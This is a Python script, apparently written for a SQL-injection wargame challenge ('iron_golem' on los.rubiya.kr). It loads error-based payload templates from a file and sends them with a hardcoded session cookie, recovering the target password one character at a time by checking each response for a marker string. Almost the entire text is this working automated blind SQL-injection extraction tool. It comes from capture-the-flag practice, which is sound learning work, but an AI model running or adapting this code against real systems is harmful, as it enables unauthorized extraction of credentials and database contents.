import string
import requests
url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"
session = requests.Session()
char = string.printable
header = {
    'Cookie' : "PHPSESSID=m71i19igi78valu1kj9kccu53j"
}
f1 = open("error-based.txt", "r")

p = "pw"

list=[]        
for ch in f1:                
    print(ch)
    list.append(ch)
user_ch = int(input("your choose : "))
sp = input("special: ")
len_pw = int(input("length :"))
password = ""
s_p = input("Sepecial params : ")

for i in range(1, len_pw):
    for j in char:
        pw = list[user_ch].replace("{pw}", s_p).replace("{i}", str(i)).replace("{j}", str(ord(j))).replace("\n", "")
        get = session.get(url=url, headers=header, params=f"{p}={pw[2:]}")
        print( get.url , get.status_code)
        if (sp in get.text):
            print(len(get.text), pw[2:], get.url)
            password = password + j
            print(password)
            break
f1.close()
